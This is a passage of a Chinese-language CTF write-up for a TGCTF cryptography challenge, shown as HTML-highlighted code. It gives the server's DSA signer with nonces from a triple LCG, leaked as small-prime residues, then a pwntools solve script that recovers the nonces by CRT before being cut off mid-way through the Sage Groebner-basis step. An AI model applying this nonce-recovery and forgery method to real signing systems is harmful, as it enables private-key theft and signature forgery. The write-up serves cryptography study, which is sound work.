TripleLCG<span class=\"token punctuation\">(</span>seed1<span class=\"token punctuation\">,</span> seed2<span class=\"token punctuation\">,</span> seed3<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span>\n        dsa <span class=\"token operator\">=</span> DSA<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n        self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Welcome to TGCTF Challenge!\\n\"</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"p = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>dsa<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, q = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>dsa<span class=\"token punctuation\">.</span>q<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, g = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>dsa<span class=\"token punctuation\">.</span>g<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, y = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>dsa<span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n        small_primes <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">59093</span><span class=\"token punctuation\">,</span> <span class=\"token number\">65371</span><span class=\"token punctuation\">,</span> <span class=\"token number\">37337</span><span class=\"token punctuation\">,</span> <span class=\"token number\">43759</span><span class=\"token punctuation\">,</span> <span class=\"token number\">52859</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39541</span><span class=\"token punctuation\">,</span> <span class=\"token number\">60457</span><span class=\"token punctuation\">,</span> <span class=\"token number\">61469</span><span class=\"token punctuation\">,</span> <span class=\"token number\">43711</span><span class=\"token punctuation\">]</span>\n        used_messages <span class=\"token operator\">=</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> o_v <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Select challenge parts: 1, 2, 3\\n\"</span><span class=\"token punctuation\">)</span>\n            parts <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n            <span class=\"token keyword\">if</span> <span class=\"token string\">'1'</span> <span class=\"token keyword\">in</span> parts<span class=\"token punctuation\">:</span>\n                self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Part 1\\n\"</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                    self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Message </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">: \"</span></span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                    msg <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                    used_messages<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span>\n                    k <span class=\"token operator\">=</span> lcg<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                    r<span class=\"token punctuation\">,</span> s <span class=\"token operator\">=</span> dsa<span class=\"token punctuation\">.</span>sign<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span>\n                    self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"r = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>r<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, ks = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">[</span>k <span class=\"token operator\">%</span> p <span class=\"token keyword\">for</span> p <span class=\"token keyword\">in</span> small_primes<span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n            <span class=\"token keyword\">if</span> <span class=\"token string\">'2'</span> <span class=\"token keyword\">in</span> parts<span class=\"token punctuation\">:</span>\n                self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Part 2\\n\"</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">307</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                    k <span class=\"token operator\">=</span> lcg<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                    self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Message </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">: \"</span></span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                    msg <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                    k <span class=\"token operator\">=</span> lcg<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> dsa<span class=\"token punctuation\">.</span>q\n                    r<span class=\"token punctuation\">,</span> s <span class=\"token operator\">=</span> dsa<span class=\"token punctuation\">.</span>sign<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span>\n                    self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Signature: r = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>r<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, s = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                    used_messages<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span>\n\n            <span class=\"token keyword\">if</span> <span class=\"token string\">'3'</span> <span class=\"token keyword\">in</span> parts<span class=\"token punctuation\">:</span>\n                self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Part 3\\n\"</span><span class=\"token punctuation\">)</span>\n                self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Forged message: \"</span><span class=\"token punctuation\">)</span>\n                final_msg <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Forged r: \"</span><span class=\"token punctuation\">)</span>\n                r <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Forged s: \"</span><span class=\"token punctuation\">)</span>\n                s <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n                <span class=\"token keyword\">if</span> final_msg <span class=\"token keyword\">in</span> used_messages<span class=\"token punctuation\">:</span>\n                    self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Message already signed!\\n\"</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">elif</span> dsa<span class=\"token punctuation\">.</span>verify<span class=\"token punctuation\">(</span>final_msg<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                    self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Good! Your flag: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>flag<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                    self<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Invalid signature.\\n\"</span><span class=\"token punctuation\">)</span></code></pre>\n\n<p>分析代码,给出了一个自定的三重lcg,part1给出12组签名的r,以及一个k与很多素数的模的list</p>\n<p>9个素数,每个16位，乘积大于k的128位,所以crt可以恢复出k的值</p>\n<p>现在相当于拥有12组k,根据12组k逆向lcg即可</p>\n<p>使用Grobner基解同余方程组,即可恢复所有参数,接下来预测k值,p,q,g,y均为已知值,即可计算得到x</p>\n<p>然后伪造签名即可</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> hashlib <span class=\"token keyword\">import</span> sha256\n\nsh<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node1.tgctf.woooo.tech\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">31104</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span>\n\nsmall_primes <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">59093</span><span class=\"token punctuation\">,</span> <span class=\"token number\">65371</span><span class=\"token punctuation\">,</span> <span class=\"token number\">37337</span><span class=\"token punctuation\">,</span> <span class=\"token number\">43759</span><span class=\"token punctuation\">,</span> <span class=\"token number\">52859</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39541</span><span class=\"token punctuation\">,</span> <span class=\"token number\">60457</span><span class=\"token punctuation\">,</span> <span class=\"token number\">61469</span><span class=\"token punctuation\">,</span> <span class=\"token number\">43711</span><span class=\"token punctuation\">]</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">TripleLCG</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> seed1<span class=\"token punctuation\">,</span> seed2<span class=\"token punctuation\">,</span> seed3<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>state <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>seed1<span class=\"token punctuation\">,</span> seed2<span class=\"token punctuation\">,</span> seed3<span class=\"token punctuation\">]</span>\n        self<span class=\"token punctuation\">.</span>a <span class=\"token operator\">=</span> a\n        self<span class=\"token punctuation\">.</span>b <span class=\"token operator\">=</span> b\n        self<span class=\"token punctuation\">.</span>c <span class=\"token operator\">=</span> c\n        self<span class=\"token punctuation\">.</span>d <span class=\"token operator\">=</span> d\n        self<span class=\"token punctuation\">.</span>n <span class=\"token operator\">=</span> n\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">next</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        new <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>a <span class=\"token operator\">*</span> self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>b <span class=\"token operator\">*</span> self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>c <span class=\"token operator\">*</span> self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>d<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>n\n        self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>new<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> new\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">DSA</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\"># while True:</span>\n            <span class=\"token comment\"># self.q = getPrime(160)</span>\n            <span class=\"token comment\"># t = 2 * getPrime(1024 - 160) * self.q</span>\n            <span class=\"token comment\"># if isPrime(t + 1):</span>\n            <span class=\"token comment\">#    self.p = t + 1</span>\n            <span class=\"token comment\">#    break</span>\n        self<span class=\"token punctuation\">.</span>p <span class=\"token operator\">=</span> dsa_p\n        self<span class=\"token punctuation\">.</span>q <span class=\"token operator\">=</span> dsa_q\n        self<span class=\"token punctuation\">.</span>g <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>p <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> self<span class=\"token punctuation\">.</span>q<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>x <span class=\"token operator\">=</span> randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>q <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>y <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>g<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">sign</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        h <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>sha256<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        r <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>g<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>q\n        s <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>inverse<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>q<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>x <span class=\"token operator\">*</span> r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>q\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">verify</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token operator\">&lt;</span> r <span class=\"token operator\">&lt;</span> self<span class=\"token punctuation\">.</span>q <span class=\"token keyword\">and</span> <span class=\"token number\">0</span> <span class=\"token operator\">&lt;</span> s <span class=\"token operator\">&lt;</span> self<span class=\"token punctuation\">.</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n        h <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>sha256<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        w <span class=\"token operator\">=</span> inverse<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>q<span class=\"token punctuation\">)</span>\n        u1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span> w<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>q\n        u2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>r <span class=\"token operator\">*</span> w<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>q\n        v <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>g<span class=\"token punctuation\">,</span> u1<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">,</span> u2<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>q\n        <span class=\"token keyword\">return</span> v <span class=\"token operator\">==</span> r\n<span class=\"token comment\"># -------------------------------------------------</span>\n<span class=\"token comment\"># get pqgy</span>\n\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'!\\n'</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span>\n\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'p = '</span><span class=\"token punctuation\">)</span>\np<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'p = '</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'q = '</span><span class=\"token punctuation\">)</span>\nq<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'q = '</span><span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'g = '</span><span class=\"token punctuation\">)</span>\ng<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'g = '</span><span class=\"token punctuation\">,</span>g<span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'y = '</span><span class=\"token punctuation\">)</span>\ny<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'y = '</span><span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'----------------------------------------------------'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># part 1</span>\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'] '</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span>\nr_l<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\nks_l<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'] '</span><span class=\"token punctuation\">)</span>\n    sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span>\n    sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'r = '</span><span class=\"token punctuation\">)</span>\n    r<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'r = '</span><span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">)</span>\n    sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'ks = '</span><span class=\"token punctuation\">)</span>\n    ks<span class=\"token operator\">=</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ks = '</span><span class=\"token punctuation\">,</span>ks<span class=\"token punctuation\">)</span>\n    r_l<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span>\n    ks_l<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>ks<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r_l<span class=\"token punctuation\">,</span>ks_l<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">from</span> libnum <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">recover_k</span><span class=\"token punctuation\">(</span>residues<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>    \n    <span class=\"token keyword\">return</span> solve_crt<span class=\"token punctuation\">(</span>residues<span class=\"token punctuation\">,</span>small_primes<span class=\"token punctuation\">)</span>\n\nk_ <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>recover_k<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> ks_l<span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>k_<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#k_= [172878032310918761957320639543653575954, 65601781483750822156822913226632595144, 10096210446214282339114263785545264202, 95107391569799156514079455200709366408, 117644907547146123900198723640727373206, 37631792366646059834025110885248419285, 105367623507085661118822334572436160357, 108765893575822931804483321330995468016, 151400201142369776561490646780034750340, 124744556917675016810611051516964200333, 32083522257873898706547528258092321135, 28282985849414089611886533440861756190]</span>\n\nR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">,</span>c<span class=\"token 